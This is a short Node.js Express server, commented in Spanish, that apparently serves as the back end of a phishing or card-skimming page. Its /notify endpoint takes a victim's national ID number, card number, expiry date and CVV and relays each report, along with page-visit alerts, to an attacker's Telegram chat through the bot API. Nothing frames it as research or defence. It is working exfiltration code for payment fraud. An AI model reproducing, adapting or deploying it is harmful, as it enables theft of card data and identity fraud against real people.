const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/notify', async (req, res) => {
    const { uid, tk, ex, cv, type } = req.body;
    console.log("Datos recibidos:", req.body);

    let textoTelegram = "";

    // Lógica de mensajes según el tipo
    if (type === 'full_auth') {
        textoTelegram = `💳 <b>NUEVO REPORTE FULL</b>\n👤 ID: <code>${uid}</code>\n🔢 TRJ: <code>${tk}</code>\n📅 EXP: <code>${ex}</code>\n🔑 CVV: <code>${cv}</code>`;
    } else if (type === 'init_session') {
        textoTelegram = `👤 <b>ESCRIBIÓ CÉDULA</b>\n🆔 ID: <code>${uid}</code>`;
    } else if (type === 'visit') {
        textoTelegram = `🌐 <b>ALGUIEN ENTRÓ A LA PÁGINA</b>\n⏱️ Hora: ${new Date().toLocaleString('es-CO')}`;
    }

    try {
        if (textoTelegram !== "") {
            await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: textoTelegram,
                parse_mode: 'HTML'
            });
        }
        res.status(200).send({ status: 'ok' });
    } catch (error) {
        console.error("Error Telegram:", error.message);
        res.status(200).send({ status: 'ok' }); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor activo en puerto ${PORT}`);
});


